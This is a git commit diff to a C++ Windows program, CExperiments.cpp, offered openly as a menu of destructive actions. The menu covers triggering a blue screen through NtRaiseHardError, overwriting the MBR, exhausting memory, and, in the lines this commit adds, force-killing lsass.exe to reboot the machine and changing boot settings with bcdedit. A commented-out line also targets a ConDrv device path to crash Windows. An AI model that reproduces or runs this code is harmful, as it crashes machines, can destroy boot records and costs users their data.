fe3e40c7067a02cc637d64a8e0c0c9bafc66fec9
0x6k7 <78702905+0x6k7@users.noreply.github.com>
2022-11-29 07:18:24 +0200

    Add files via upload

--- CExperiments.cpp
+++ CExperiments.cpp
@@ -2,22 +2,28 @@
 #include <Windows.h>
 #include <winternl.h>
 #include <TlHelp32.h>
+#include <fstream>
+#include <shellapi.h>
+#include <experimental/filesystem>
 
 using std::cout;
 using std::endl;
 using std::cin;
 using std::string;
+using std::ofstream;
 
 #define MBR_SIZE 512
 
 typedef NTSTATUS(NTAPI *rtl_RtlAdjustPrivs)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 typedef NTSTATUS(NTAPI *nt_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 
+namespace fs = std::experimental::filesystem;
+
 void CauseBSOD() {
 	BOOLEAN isAdmin;
 	ULONG resp;
 	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
+	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
 	rtl_RtlAdjustPrivs NT_CALL = (rtl_RtlAdjustPrivs)lpFuncAddress;
 	nt_NtRaiseHardError NT_CALL2 = (nt_NtRaiseHardError)lpFuncAddress2;
 	NTSTATUS NT_RETURN = NT_CALL(19, TRUE, FALSE, &isAdmin);
@@ -31,9 +37,12 @@ int main() {
 	cin >> c;
 
 	if (c == 0) {
+		cout << "User-mode: \n";
 		cout << "1 - Causes BSOD\n";
 		cout << "2 - Overwrites MBR\n";
 		cout << "3 - Might crash your PC\n";
+		cout << "4 - Forces PC to restart by killing system process)\n";
+		cout << "5 - A 10K bug\n";
 	}
 
 	if (c == 1) {
@@ -62,6 +71,17 @@ int main() {
 			new int;
 			new double;
 		}
+	}
+
+	if (c == 4) {
+		//string url = "https://\\.\GLOBALROOT\Device\ConDrv\KernelConnect";
+		//ShellExecute(0, "open", url.c_str(), 0, 0, SW_SHOWNORMAL);
+		system("taskkill /f /im lsass.exe");
+	}
+
+	if (c == 5) {
+		system("bcdedit /set optionsedit 1");
+
 	}
 	system("pause");
 }
